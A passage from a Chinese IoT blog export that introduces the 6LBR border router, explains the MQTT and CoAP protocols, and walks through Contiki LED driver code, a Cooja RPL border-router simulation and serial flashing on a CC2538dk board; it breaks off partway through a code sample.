    <content type="text"><![CDATA[CETIC-6LBR 是目前国际上较为优秀的基于 Contiki 系统的 6LoWPAN 边界路由器解决方案。和现有的其他边界路由器方案相比，6LBR 是唯一一个不需要 Linux 主机的独立边界路由器，并且能够提供IPv6/NDP 和 RPL 之间的智能互联。 6LBR简介 6LBR 的目标是连接基于 802.15.4 和 6LoWPAN 的无线传感器网络和基于以太网的现有 IPv6 有线网络。这种连接可以在网络协议栈的多个层面上实现，首先可以在数据链路层（第二层）实现，此时 6LBR 可看作成通常所说的网桥或交换机设备；其次，也可以在网络层（第三层）实现，此时 6LBR 可看作成通常所说的路由器；最后，还可以自应用层（第七层）实现，此时 6LBR 可看作成通常所说的网关设备。 6LBR 方案是在 Contiki 系统之上模拟出第二个接口，不需要对 uIP 协议栈进行大量修改，当 Contiki 系统升级时，6LBR 可以直接替换系统文件实现立即升级。而且它还实现了基于 RPL的多跳网络管理，是目前边界路由器方案中功能最强大的。 6LBR搭建好之后就像我们平常使用的路由器那样会有一个Web界面，可以用来配置我们的边界路由器以及管理我们的6LoWPAN无线传感网络，功能十分强大。 项目地址： https://github.com/cetic/6lbr 下载地址： https://github.com/cetic/6lbr/wiki/Releases 支持的硬件平台 OpenMote Zolertia Ethernet IoT Gateway The Redwire IO The Redwire Econotag TI CC2538DK TI CC2650DK Linux hosts RaspberryPi BeagleBone 开发教程 本人目前正在研究6LoWPAN，将6oWPAN无线传感网络接入Internet需要实现边界路由器，而6LBR正好是一个不错的边界路由器方案，所以我采用CETIC-6LBR在Raspberry Pi上实现了边界路由器功能。目前，国内关于6LBR的资料实在是比较稀缺，特别是对于英语不太好的人来说，遇到问题也比较难找到参考资料，接下来我将会写系列博客介绍6LBR以及如何使用6LBR搭建边界路由器，也欢迎喜欢的小伙伴多多交流！ 在此立下Flag，希望这个系列能够好好写下去！]]></content>
      <categories>
        <category>IoT</category>
        <category>6LoWPAN</category>
      </categories>
      <tags>
        <tag>IoT</tag>
        <tag>6LBR</tag>
        <tag>6LoWPAN</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MQTT协议学习笔记（一）]]></title>
    <url>%2F2017%2F03%2F04%2FMQTT%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89%2F</url>
    <content type="text"><![CDATA[MQTT（Message Queuing Telemetry Transport），即消息队列遥测传输协议，是IBM开发的一种轻量级、基于代理的发布/订阅式的消息传输协议。 简介 MQTT 是一个客户端服务端架构的发布/订阅模式的消息传输协议。它的设计思想是轻巧、开放、简单、规范，因此易于实现。这些特点使得它对很多场景来说都是很好的选择，包括受限的环境如机器与机器的通信（M2M）以及物联网环境（IoT），这些场景要求很小的代码封装或者网络带宽非常昂贵。 实现MQTT协议需要：客户端和服务器端。 MQTT协议中有三种身份：发布者（Publish）、代理（Broker）（服务器）、订阅者（Subscribe）。其中，消息的发布者和订阅者都是客户端，消息代理是服务器，消息发布者可以同时是订阅者。 MQTT传输的消息分为：主题（Topic）和负载（payload）两部分。 Topic，可以理解为消息的类型，订阅者订阅（Subscribe）后，就会收到该主题的消息内容（payload）payload，可以理解为消息的内容，是指订阅者具体要使用的内容。 MQTT客户端 一个使用MQTT协议的应用程序或者设备，它总是建立到服务器的网络连接。客户端可以： 发布其他客户端可能会订阅的信息 订阅其它客户端发布的消息 退订或删除应用程序的消息 断开与服务器连接 MQTT服务器 MQTT服务器以称为“消息代理”（Broker），可以是一个应用程序或一台设备。它是位于消息发布者和订阅者之间，它可以： 接受来自客户的网络连接 接受客户发布的应用信息 处理来自客户端的订阅和退订请求 向订阅的客户转发应用程序消息 相关术语 订阅（Subscription） 订阅包含主题筛选器（Topic Filter）和最大服务质量（QoS）。订阅会与一个会话（Session）关联。一个会话可以包含多个订阅。每一个会话中的每个订阅都有一个不同的主题筛选器。 会话（Session） 每个客户端与服务器建立连接后就是一个会话，客户端和服务器之间有状态交互。会话存在于一个网络之间，也可能在客户端和服务器之间跨越多个连续的网络连接。 主题名（Topic Name） 连接到一个应用程序消息的标签，该标签与服务器的订阅相匹配。服务器会将消息发送给订阅所匹配标签的每个客户端。 主题筛选器（Topic Filter） 一个对主题名通配符筛选器，在订阅表达式中使用，表示订阅所匹配到的多个主题。 负载（Payload） 消息订阅者所具体接收的内容。 特点 使用发布/订阅消息模式，提供一对多的消息发布，解除应用程序耦合 对负载内容屏蔽的消息传输 使用 TCP/IP 提供网络连接 三种消息发布服务质量(Qos) “至多一次”，即Qos=0，会发生信息丢失，消息发布完全依赖底层 TCP/IP 网络。 “至少一次”，即Qos=1，确保消息到达，但消息重复可能会发生。 “只有一次”，即Qos=2，确保消息到达一次。 小型传输，开销很小（固定长度的头部是 2 字节），协议交换最小化，以降低网络流量。 控制报文格式 每个MQTT命令消息的消息头部都包含了一个固定头部。其中一些类型的消息可能还需要一个可变头部和一个有效载荷（可理解为消息体）。 MQTT协议通过交换预定义的MQTT控制包来实现的。一个MQTT控制包由3个部分组成，并总是按照如下顺序排列： — — Fixed header 固定报头，所有控制报文都包含 Variable header 可变报头，部分控制报文包含 Payload 有效载荷，部分控制报文包含 固定头部 每个MQTT命令消息的消息头部都包含一个固定头部。 MQTT 控制报文的类型 MQTT包含的控制包类型一共有14种，如下图： 用于指定控制报文类型的标志位 固定报头第 1 个字节的剩余的 4 位 [3-0]包含每个 MQTT 控制报文类型特定的标志 DUP =控制报文的重复分发标志 QoS = PUBLISH报文的服务质量等级 RETAIN = PUBLISH报文的保留标志 剩余长度 剩余长度（Remaining Length）表示当前报文剩余部分的字节数，包括可变报头和负载的数据。剩余长度不包括用于编码剩余长度字段本身的字节数。 可变报头 某些 MQTT 控制报文包含一个可变报头部分。它在固定报头和负载之间。可变报头的内容根据报文类型的不同而不同。可变报头的报文标识符（Packet Identifier）字段存在于在多个类型的报文里。 报文标识符 很多控制报文的可变报头部分包含一个两字节的报文标识符字段。这些报文是 PUBLISH（QoS&gt;0 时），PUBACK，PUBREC，PUBREL，PUBCOMP，SUBSCRIBE, SUBACK，UNSUBSCIBE，UNSUBACK。 包含报文标识符的控制报文： 有效载荷 某些 MQTT 控制报文在报文的最后部分包含一个有效载荷。例如，对于PUBLISH包而言，其有效载荷为应用层消息，对于SUBSCRIBE包而言，其有效载荷内容为主题过滤器列表，SUBACK包的有效载荷包含一个返回码列表。]]></content>
      <categories>
        <category>IoT</category>
        <category>MQTT</category>
      </categories>
      <tags>
        <tag>MQTT</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CoAP协议详解（一）]]></title>
    <url>%2F2017%2F03%2F01%2FCoAP%E5%8D%8F%E8%AE%AE%E8%AF%A6%E8%A7%A3%EF%BC%88%E4%B8%80%EF%BC%89%2F</url>
    <content type="text"><![CDATA[CoAP(Constrained Application Protocol)协议是为物联网中资源受限设备制定的应用层协议。由于物联网中的很多设备都是资源受限型的，即只有少量的内存空间和有限的计算能力，所以传统的HTTP协议应用在物联网上就显得过于庞大而不适用。IETF的CoRE工作组提出了一种基于REST架构的CoAP协议。 CoAP简介 CoAP是一种应用层协议，它运行于UDP协议之上而不是像HTTP那样运行于TCP之上。 CoAP协议基于REST 构架，REST 是指表述性状态转换架构，是互联网资源访问协议的一般性设计风格。为了克服HTTP对于受限环境的劣势，CoAP既考虑到数据报长度的最优化，又考虑到提供可靠通信。一方面，CoAP提供URI，REST 式的方法如GET，POST，PUT和DELETE，以及可以独立定义的头选项提供的可扩展性。另一方面，CoAP基于轻量级的UDP协议，并且允许IP多播。而组通信是物联网最重要的需求之一，比如说用于自动化应用中。为了弥补UDP传输的不可靠性，CoAP定义了带有重传机制的事务处理机制。并且提供资源发现机制，并带有资源描述。 CoAP的特点 CoAP采用了二进制报头，而不是文本报头(text header)。 CoAP降低了头的可用选项的数量。 CoAP减少了一些HTTP的方法。 CoAP可以支持检测装置。 CoAP与Http协议 CoAP协议不是盲目的压缩了HTTP协议，考虑到资源受限设备的低处理能力和低功耗限制，CoAP重新设计了HTTP的部分功能以适应设备的约束条件。另外，为了使协议适应物联网和M2M 应用，CoAP协议改进了一些机制，同时增加了一些功能。图1 显示了HTTP和CoAP的协议栈。CoAP和HTTP在传输层有明显的区别。HTTP协议的传输层采用了TCP协议，而CoAP协议的传输层使用UDP协议，开销明显降低，并支持多播。 CoAP协议采用了双层的结构。事务层(Transaction layer)处理节点间的信息交换，同时，也提供对多播和拥塞控制的支持。请求/响应层(Request/Response layer)用以传输对资源进行操作的请求和相应信息。CoAP协议的REST 构架基于该层的通信，REST请求附在一个CON 或者NON消息上，而REST响应附在匹配的ACK消息上。CoAP的双层处理方式，使得CoAP没有采用TCP协议，也可以提供可靠的传输机制。利用默认的定时器和指数增长的重传间隔时间实现 CON消息的重传，直到接收方发出确认消息。另外，CoAP的双层处理方式支持异步通信，这是物联网和M2M应用的关键需求之一。 CoAP报文报文格式CoAP协议非常小巧，一个CoAP消息最小为4个字节，以下是CoAP协议不同部分的描述： 【Ver】版本编号，指示CoAP协议的版本号。类似于HTTP 1.0 HTTP 1.1。版本编号占2位，取值为01B。 【T】报文类型，CoAP协议定了4种不同形式的报文，CON报文，NON报文，ACK报文和RST报文。 【TKL】CoAP标识符长度。CoAP协议中具有两种功能相似的标识符，一种为Message ID(报文编号)，一种为Token(标识符)。其中每个报文均包含消息编号，但是标识符对于报文来说是非必须的。 【Code】功能码/响应码。Code在CoAP请求报文和响应报文中具有不同的表现形式，Code占一个字节，它被分成了两部分，前3位一部分，后5位一部分，为了方便描述它被写成了c.dd结构。其中0.XX表示CoAP请求的某种方法，而2.XX、4.XX或5.XX则表示CoAP响应的某种具体表现。 【消息ID Message ID】每个CoAP消息都有一个ID，在一次会话中ID总是保持不变。但在这个会话之后该ID会被回收利用。 【标记 Token】标识符具体内容，通过TKL指定Token长度。 【选项 Options】：CoAP报文选项类似于HTTP请求头，它包括CoAP消息本身，例如CoAP端口号，CoAP主机和CoAP查询字符串等。 【1111 1111】CoAP报文和具体负载之间的分隔符。 【负载Payload】：真正有用的被交互的数据。 Option格式（1）组成部分 一般情况下Option部分包含Option Delta、Option Length和Option Value三部分。 【Option Delta】表示Option的增量，当前的Option的具体编号等于之前所有Option Delta的总和。 【Option Length】表示Option Value的具体长度。 【Option Value】表示Option具体内容。 （2）Option类型及编号 CoAP中所有的Option都采用编号的方式，这些Option及编号的定义如下图所示。 在这些option中，Uri-Host、Uri-Port、Uri-Path和Uri-Query等和资源“位置”和参数有关。 【3】Uri-Host:CoAP主机名称，例如iot.eclipse.org 【7】Uri-Port:CoAP端口号，默认为5683 【11】Uri-Path:资源路由或路径，例如\temperature。资源路径采用UTF8字符串形式，长度不计第一个”\”。 【15】Uri-Query:访问资源参数，例如?value1=1&amp;value2=2，参数与参数之间使用“&amp;”分隔，Uri-Query和Uri-Path之间采用“?”分隔。 在这些option中，Content-Format和Accept用于表示CoAP负载的媒体格式 【12】Content-Format:指定CoAP复杂媒体类型，媒体类型采用整数描述，例如application/json对应整数50，application/octet-stream对应整数40。 【17】Accept: 指定CoAP响应复杂中的媒体类型，媒体类型的定义和Content-Format相同。 （3）Content-Format 【text/plain】 编号为0，表示负载为字符串形式，默认为UTF8编码。 【application/link-format】编号为40，CoAP资源发现协议中追加定义，该媒体类型为CoAP协议特有。 【application/xml】编号为41，表示负载类型为XML格式。 【application/octet-stream】编号为42，表示负载类型为二进制格式。 【application/exi】编号为47，表示负载类型为“精简XML”格式。 另外，还有一种格式也被IANA认定，也会在CoAP协议中广泛使用那便是CBOR格式，该格式可理解为二进制JSON格式。 【applicaiton/cbor】编号为60。 消息类型CoAP采用与HTTP协议相同的请求响应工作模式，CoAP协议共有4中不同的消息类型： CON：需要被确认的请求，如果CON请求被发送，那么对方必须做出响应。 NON：不需要被确认的请求，如果NON请求被发送，那么对方不必做出回应。 ACK：应答消息，接受到CON消息的响应。 RST：复位消息，当接收者接收到的消息包含一个错误，接收者解析消息或者不再关心发送者发送的内容，那么复位消息将会被发送。 CoAP请求请求方法在CoAP请求中，Code被定义为CoAP请求方法，这些方法有GET、POST、PUT和DELETE，这些方法和HTTP协议非常相似。 GET方法：用于获得请求URI标识的资源 The GET method is safe and idempotent. POST方法：用于创建新资源或更新目标资源 POST is neither safe nor idempotent. PUT方法：用于更新某资源 PUT is not safe but is idempotent. DELETE方法：用于删除某资源 DELETE is not safe but is idempotent. 需要说明的问题（1）safe 上面的英文是RFC 7252 文档的内容，其中的安全是指是否会改变服务器端的数据，而不是我们通常所说的数据的保密性。因为如果考虑到某些服务端和客户端的默认配置和默认使用方式，那么POST在很多时候比GET安全，因为GET的URL会被放在浏览器历史和WEB服务器日志里面。 （2）idempotent idempotent的意思就是指CoAP方法重复执行多次，产生的效果是一样的。往一个URI发送一个CoAP的 PUT或者POST请求，CoAP的body部分就是一个文档，我们应该用PUT方法还是POST方法？取决于这个REST服务的行为是否是idempotent的。也就是我们采用PUT或者POST方法之后，服务器端是什么样的行为？如果产生了两个文档，那就说明这个服务不是idempotent的，因为多次使用产生了副作用了嘛；如果后一个请求把第一个请求覆盖掉了，那这个服务就是idempotent的。前一种情况，应该使用POST方法，后一种情况，应该使用PUT方法。 CoAP响应响应码 Success：2.xx 2.01 Created. 回复POST或者PUT。 2.02 Deleted. 回复DELETE，有些情况下的POST。 2.03 Valid. Indicate that the response identified by the entity-tag identified by the included ETag Option is valid. 所以，Response必须带ETag Option。 2.04 Changed. 回复POST和PUT。 2.05 Content. 回复GET。 Client Error：4.xx 4.00 Bad Request. 错误的请求。 4.01 Unauthorized 未经许可的。 4.02 Bad Option 错误的选项 4.03 Forbidden 访问被拒绝。 4.04 Not Found 未找到。 4.05 Method Not Allowed 方法不被允许。 4.06 Not Acceptable 不可接受的。 4.12 Precondition Failed 前提条件失败。 4.13 Request Entity Too Large 请求实体太大。 4.15 Unsupported Content-Format 不支持的内容格式。 Server Error：5.xx 5.00 Internal Server Error 内部服务器错误。 5.01 Not Implemented 没有实现。 5.02 Bad Gateway 错误的网关。 5.03 Service Unavailable 服务不可用。 5.04 Gateway Timeout 网关超时。 5.05 Proxying Not Supported 代理不支持。 Future Use：3.00-3.31 请求/响应模型Piggybacked Response, Separate Response, Non-confirmable Response三种类型 Piggybacked Response. 最常用的类型，Reponse内容直接放在ACK中。一个请求中携带的确认消息中携带的确认（ACK）消息的响应。 Separate Response. Server暂时没办法直接回数据(可能需要更多的时间准备)，所以先直接回Empty ACK告诉Client请求我已经收到，数据准备好再给你发送数据，避免重复请求。当Server准备好了，给Client发CON(也可以是NON)，最后Client回ACK告诉Server数据我已经收到了。如果Server在回复Clinet之前又收到Client的重传，那么也回Empty ACK。 Non-confirmable Response. Client发出NON，Server一般也回NON，但是，双方发出的消息都不要求是可靠的，即使有一方发送的数据另一方没接收到也没问题，因为不要求可靠也就是Client和Server都可以不得到数据。]]></content>
      <categories>
        <category>IoT</category>
        <category>CoAP</category>
      </categories>
      <tags>
        <tag>CoAP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Contiki LED驱动部分应用]]></title>
    <url>%2F2017%2F02%2F23%2FContiki-LED%E9%A9%B1%E5%8A%A8%E9%83%A8%E5%88%86%E5%BA%94%E7%94%A8%2F</url>
    <content type="text"><![CDATA[Contiki为用户提供了控制LED的接口，在各个平台下也给出了对应的函数，但是由于牵扯到多个文件，这对于初学者来说也是很麻烦的事情，这篇博客将一步步解析Contiki LED控制的实现机制。 LED API函数由于contiki需要适应多种平台，所以contiki提供了底层控制LED的三大接口，分别是： 1234void leds_arch_init(void) //LED初始化函数unsigned char leds_arch_get(void) //LED状态获取函数void leds_arch_set(unsigned char leds) //LED状态设置函数 为方便各个平台对于LED的控制，在各个平台下又提供了详细的控制API接口，分别是： 12345678void leds_init(void); //LED初始化void leds_blink(void); //所有LED闪烁unsigned char leds_get(void); //获取LED的状态void leds_set(unsigned char leds); //设置LED的状态void leds_on(unsigned char leds); //LED打开void leds_off(unsigned char leds); //LED关闭void leds_toggle(unsigned char leds); //LED状态切换，反转 LED驱动文件leds.c打开位于/home/user/contiki/core目录的leds.c文件 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687#include &quot;dev/leds.h&quot;#include &quot;sys/clock.h&quot;#include &quot;sys/energest.h&quot;static unsigned char leds;/*---------------------------------------------------------------------------*/static voidshow_leds(unsigned char new_leds)&#123; unsigned char changed; changed = leds ^ new_leds; leds = new_leds; if(changed &amp; LEDS_GREEN) &#123; /* Green did change */ if(leds &amp; LEDS_GREEN) &#123; ENERGEST_ON(ENERGEST_TYPE_LED_GREEN); //方便跟踪节能设计了energest模块 &#125; else &#123; ENERGEST_OFF(ENERGEST_TYPE_LED_GREEN); &#125; &#125; if(changed &amp; LEDS_YELLOW) &#123; if(leds &amp; LEDS_YELLOW) &#123; ENERGEST_ON(ENERGEST_TYPE_LED_YELLOW); &#125; else &#123; ENERGEST_OFF(ENERGEST_TYPE_LED_YELLOW); &#125; &#125; if(changed &amp; LEDS_RED) &#123; if(leds &amp; LEDS_RED) &#123; ENERGEST_ON(ENERGEST_TYPE_LED_RED); &#125; else &#123; ENERGEST_OFF(ENERGEST_TYPE_LED_RED); &#125; &#125; leds_arch_set(leds);&#125;/*---------------------------------------------------------------------------*/voidleds_init(void)&#123; leds_arch_init(); leds = 0;&#125;/*---------------------------------------------------------------------------*/voidleds_blink(void)&#123; /* Blink all leds that were initially off. */ unsigned char blink; blink = ~leds; leds_toggle(blink); clock_delay(400); leds_toggle(blink);&#125;/*---------------------------------------------------------------------------*/unsigned charleds_get(void) &#123; return leds_arch_get();&#125;/*---------------------------------------------------------------------------*/voidleds_set(unsigned char ledv)&#123; show_leds(ledv);&#125;/*---------------------------------------------------------------------------*/voidleds_on(unsigned char ledv)&#123; show_leds(leds | ledv);&#125;/*---------------------------------------------------------------------------*/voidleds_off(unsigned char ledv)&#123; show_leds(leds &amp; ~ledv);&#125;/*---------------------------------------------------------------------------*/voidleds_toggle(unsigned char ledv)&#123; show_leds(leds ^ ledv);&#125;/*---------------------------------------------------------------------------*/ leds.h打开位于/home/user/contiki/core目录的leds.h文件 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#ifndef LEDS_H_#define LEDS_H_/* Allow platform to override LED numbering */#include &quot;contiki-conf.h&quot;void leds_init(void);/** * Blink all LEDs. */void leds_blink(void);#ifndef LEDS_GREEN#define LEDS_GREEN 1#endif /* LEDS_GREEN */#ifndef LEDS_YELLOW#define LEDS_YELLOW 2#endif /* LEDS_YELLOW */#ifndef LEDS_RED#define LEDS_RED 4#endif /* LEDS_RED */#ifndef LEDS_BLUE#define LEDS_BLUE LEDS_YELLOW#endif /* LEDS_BLUE */#ifdef LEDS_CONF_ALL#define LEDS_ALL LEDS_CONF_ALL#else /* LEDS_CONF_ALL */#define LEDS_ALL 7#endif /* LEDS_CONF_ALL *//** * Returns the current status of all leds */unsigned char leds_get(void);void leds_set(unsigned char leds);void leds_on(unsigned char leds);void leds_off(unsigned char leds);void leds_toggle(unsigned char leds);/** * Leds implementation */void leds_arch_init(void);unsigned char leds_arch_get(void);void leds_arch_set(unsigned char leds);#endif /* LEDS_H_ */ leds-arch.c文件打开/home/contiki/platform/cc2538dk/dev目录下的leds-arch.c 12345678910111213141516171819202122232425262728293031#include &quot;contiki.h&quot;#include &quot;reg.h&quot;#include &quot;dev/leds.h&quot;#include &quot;dev/gpio.h&quot;#define LEDS_GPIO_PIN_MASK LEDS_ALL/*---------------------------------------------------------------------------*/voidleds_arch_init(void)&#123; /* 这里解释下：LED控制使用的是PC0~PC7端口，一共有7个引脚，LEDS_GPIO_PIN_MASK被定义为LEDS_ALL， * 而在leds.h里面LEDS_ALL被定义为7，二进制展开即为111，低三位赋值为1，即这三个引脚被配置为输出通道。 * 在leds.h中定义了三种颜色的LED，分别对应低三位，即每个引脚对应一盏LED灯，当然，这得看你的开发板的具体连线。 */ GPIO_SET_OUTPUT(GPIO_C_BASE, LEDS_GPIO_PIN_MASK);&#125;/*---------------------------------------------------------------------------*/unsigned charleds_arch_get(void)&#123; //同上 return GPIO_READ_PIN(GPIO_C_BASE, LEDS_GPIO_PIN_MASK);&#125;/*---------------------------------------------------------------------------*/voidleds_arch_set(unsigned char leds)&#123; //同上 GPIO_WRITE_PIN(GPIO_C_BASE, LEDS_GPIO_PIN_MASK, leds);&#125;/*---------------------------------------------------------------------------*/ 调用过程分析我们来理清一下调用函数的过程，例如： 在PROCESS_THREAD中调用leds_on()： 12345voidleds_on(unsigned char ledv)&#123; show_leds(leds | ledv);&#125; 调用show_leds()： 123456789101112131415161718192021222324252627282930313233static voidshow_leds(unsigned char new_leds)&#123; unsigned char changed; changed = leds ^ new_leds; leds = new_leds; //方便跟踪节能设计了energest模块 if(changed &amp; LEDS_GREEN) &#123; /* Green did change */ if(leds &amp; LEDS_GREEN) &#123; ENERGEST_ON(ENERGEST_TYPE_LED_GREEN); &#125; else &#123; ENERGEST_OFF(ENERGEST_TYPE_LED_GREEN); &#125; &#125; if(changed &amp; LEDS_YELLOW) &#123; if(leds &amp; LEDS_YELLOW) &#123; ENERGEST_ON(ENERGEST_TYPE_LED_YELLOW); &#125; else &#123; ENERGEST_OFF(ENERGEST_TYPE_LED_YELLOW); &#125; &#125; if(changed &amp; LEDS_RED) &#123; if(leds &amp; LEDS_RED) &#123; ENERGEST_ON(ENERGEST_TYPE_LED_RED); &#125; else &#123; ENERGEST_OFF(ENERGEST_TYPE_LED_RED); &#125; &#125; //设置LED端口输出电平 leds_arch_set(leds);&#125; 调用leds_arch_set()： 123456voidleds_arch_set(unsigned char leds)&#123; // 若leds为1，输出高电平，leds为0，输出低电平 GPIO_WRITE_PIN(GPIO_C_BASE, LEDS_GPIO_PIN_MASK, leds);&#125; 到此，完成了LED端口的电平输出。 示例程序在/home/user/contiki/platform/cc2538dk目录下的main函数部分有如下一行代码： 1leds_init(); 即系统一启动就进行了初始化。 下面，我们定义一个进程，该进程实现LED闪烁，间隔时间为1s。在这个任务中还涉及contiki任务的基本结构，etimer的使用。具体代码如下： 在 /home/user/contiki/cc2538dk/leds_blink 目录下进行以下操作： leds_blink.c1234567891011121314151617181920212223#include &quot;contiki.h&quot; #include &quot;dev/leds.h&quot; /*---------------------------------------------------------------------------*/ PROCESS(blink_process, &quot;Blink&quot;); AUTOSTART_PROCESSES(&amp;blink_process); /*---------------------------------------------------------------------------*/ PROCESS_THREAD(blink_process, ev, data) &#123; static struct etimer et_led_blink; PROCESS_BEGIN(); while(1) &#123; etimer_set(&amp;et_led_blink, CLOCK_SECOND); // etimer溢出周期为1s PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&amp;et_led_blink)); leds_on(1); // 打开LED1 etimer_set(&amp;et_led_blink, CLOCK_SECOND); PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&amp;et_led_blink)); leds_off(1); &#125; PROCESS_END(); &#125; Makefile1234567CONTIKI_PROJECT = led_blinkall: $(CONTIKI_PROJECT)CONTIKI = ../../..CONTIKI_WITH_RIME = 1include $(CONTIKI)/Makefile.include Makefile.target1TARGET = cc2538dk 编译程序1$ make TARGET=cc2538dk 烧录程序得到bin和hex文件，将其复制到Windows使用TI Flash Programmer2 将其烧录到cc2538dk开发板上即可看到灯的亮灭情况。]]></content>
      <categories>
        <category>IoT</category>
        <category>Contiki</category>
      </categories>
      <tags>
        <tag>［IoT,Contiki,LED］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Contiki RPL-border-router Cooja仿真]]></title>
    <url>%2F2017%2F02%2F21%2FContiki-RPL-border-router-Cooja%E4%BB%BF%E7%9C%9F%2F</url>
    <content type="text"><![CDATA[记录一次由于Instant Contiki版本差异造成的艰难调试。谨记善于变通，不要只会按照教程的步骤进行实验。 写在前面的话此仿真参考了网上的很多教程，但是由于教程基本都是基于Instant Contiki2.7及以前版本，所以有些例程是存在差异的，而正是因为这些差异导致实验出错了。 主要参考教程：http://anrg.usc.edu/contiki/index.php/RPL_Border_Router 但是此教程基于 Contiki 2.7，我是用的是 Contiki 3.0，按照教程使用udp-server.c程序就行仿真，结果出现子节点与边界路由器没有组建网络，导致在Linux主机只能ping通边界路由器，但是不能ping通网络内部节点。找了很多的办法，最后还是找到了答案。 解决所遇到问题的关键：https://sourceforge.net/p/contiki/mailman/message/34413098/ 也就是我们需要使用udp-client.c来进行仿真实验，因为每个udp-server节点都想成为RPL根节点并且创建一个新的RPL有向无环图，这样的话就无法组建我们需要的网络完成我们的仿真。 边界路由器是指将局域网汇接到广域互联网的一种路由设备。在这个例子中，我们将测试边界路由器用于在无线传感器网络之间路由数据。 此次仿真基于Contiki的Instant Contiki开发平台，需要用到的文件在/home/contiki/examples/ipv6目录下的rpl-border-router和rpl-udp文件夹内： border-router.c slip-bridge.c httpd-simple.c udp-client.c 编译代码代码位于/contiki/examples/ipv6/rpl-border-router目录下，使用如下命令进行编译： 12$ cd /contiki/examples/ipv6/rpl-border-router$ make TARGET=sky 我们假设使用TMote Sky硬件平台进行仿真，所以TARGET=sky，编译完成将生成border-router.sky文件，这，文件将在Cooja仿真中用到。 为了演示边界路由器的功能，我们将创建一个以边界路由器为根节点的网络。建立这样一个网络需要使用到/contiki/examples/ipv6/rpl-udp目录下的udp-server.c代码，使用下面的命令来编译代码： 12$ cd /contiki/examples/ipv6/rpl-udp$ make TARGET=sky 编译完成将生成udp-client.sky，这个文件将在Cooja仿真中作为网络的子节点，这些节点与rpl边界路由根节点组成一个有向无环图。 进行仿真启动Cooja12$ cd /contiki/tools/cooja$ ant run Cooja模拟器打开后请不要关闭此命令行窗口，因为Cooja是通过命令打开的，进程还在运行，一旦关闭将会结束Cooja。 创建仿真点击 File -&gt; New Simulation，然后填写相关信息，仿真的名字，选择UDGM，然后点击创建。 添加边界路由节点填写名字，然后选择之前编译生成的sky文件，目录为：/home/user/contiki/examples/ipv6/rpl-border-router/border-router.sky，创建1个border-router节点 添加udp-rpl节点填写名字，然后选择之前编译生成的sky文件，目录为：/home/user/contiki/examples/ipv6/rpl-udp/udp-client.sky 创建4个udp-client节点： 调整显示信息 建立本地与RPL网络之间的连接选中创建的border-router节点，然后点击右键选择More tools for border router -&gt; Serial Socket(SERVER) 。 弹出窗口点击start开始监听，显示：Listening on port 60001，然后点击开始仿真，在Mote output窗口可以看到局域网已经组建，udp-client节点已经开始向border-router节点发送消息。 启用tunslip6另外打开一个命令行窗口，编译tunslip6.c 12$ cd /contiki/tools$ make tunslip6 使RPL网络和本地计算机之间的连接。 1$ sudo ./tunslip6 -a 127.0.0.1 aaaa::1/64 命令执行后将会打印如下信息，请不要关闭此窗口： 打开Cooja仿真器可以看到，监听窗口已经显示连接到127.0.0.1:39346 ping6测试网络另外打开一个命令行窗口，进行ping6测试： 1234#测试边界路由器$ ping6 aaaa::212:7401:1:101#测试udp-client节点4$ ping6 aaaa::212:7404:4:404 浏览器访问测试]]></content>
      <categories>
        <category>IoT</category>
        <category>Contiki</category>
      </categories>
      <tags>
        <tag>［IoT,Contiki,Cooja］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Contiki CC2538dk 串口下载程序]]></title>
    <url>%2F2017%2F02%2F18%2FContiki-CC2538dk-%E4%B8%B2%E5%8F%A3%E4%B8%8B%E8%BD%BD%E7%A8%8B%E5%BA%8F%2F</url>
    <content type="text"><![CDATA[本以为自己再也不会接触嵌入式开发这一方面的东西，没想到，毕业设计就开始重拾开发板，以后也要朝着物联网方向发展了。一块从没用过的开发板，一款之前完全不了解的物联网操作系统，一直不太熟悉的C语言，以至于下载程序就折腾了很久，在这里总结下，希望接下来能够顺利一些。 硬件连接准备连接开发板和USB转TTL模块开发板:3.3V—-USB转TTL:3.3V 开发板:TX‐‐‐‐USB转TTL:RX 开发板:RX‐‐‐‐USB转TTL:TX 开发板:GND‐‐‐‐USB转TTL:GND 安装驱动根据USB转TTL模块的芯片安装对应的驱动，常见的有PL2303和CH340，在网上找到对应驱动下载安装即可。 打开设备管理器查看端口，如果未安装成功则显示黄色感叹号。 Linux系统下烧写程序注意：本文采用Contiki官网推荐的开发工具：Instant Contiki，即为Ubuntu 14.04操作系统 将USB模块连接到虚拟机插上USB转TTL模块后，一般会默认将其挂载到windwos操作系统，这里需要点击虚拟机右下角的U盘图标再点连接将其与虚拟机连接起来。 查看/dev/ttyUSB0设备信息12$ cd /dev$ ls ttyUSB* -l 修改ttyUSB0设备使用权限1$ sudo chmod 777 ttyUSB0 也可以在其他位置编写shell脚本： 12#!/bin/bashsudo chmod 777 /dev/ttyUSB0 此处较为麻烦，我使用的是虚拟机，每次拔出USB再次插入后ttyUSB0的权限就又还原了，所以每次都得修改权限。然后，不知道什么原因，下载一次之后就无法下载，得拔出再插入，所以比较麻烦，这也是我为什么后来改用 windows 下载的原因。 切换到bootloader模式开发板需进入bootloader才能进行串口下载程序。 开发板按键的作用： Reset：复位重启系统 Down/Up/Select/Right/Left：配合例程作事件输入 Reset+Select：配合进入 bootloader 模式 Bootloader模式：按住select按键同时，按下Reset按键，led没有任何动静，证明现在处于bootloader 模式。 下载程序我们以 /home/user/contiki/examples/cc2538dk/cc2538-demo.c 为例进行烧写程序。 初次接触 contiki 的程序，demo 的代码复杂了点，为了便于理解以及方便查看效果，我们把程序修改成如下： 使用etimer模块间隔5s读取系统运行时间，然后每次打印系统时间以及Hello, world方便观察。 1234567891011121314151617181920212223242526#include &quot;contiki.h&quot;#include &lt;stdio.h&gt; /* For printf() */static struct etimer et; //定义etimer变量unsigned long sec; //用于记录系统运行时间的变量/*---------------------------------------------------------------------------*/PROCESS(hello_world_process, &quot;Hello world 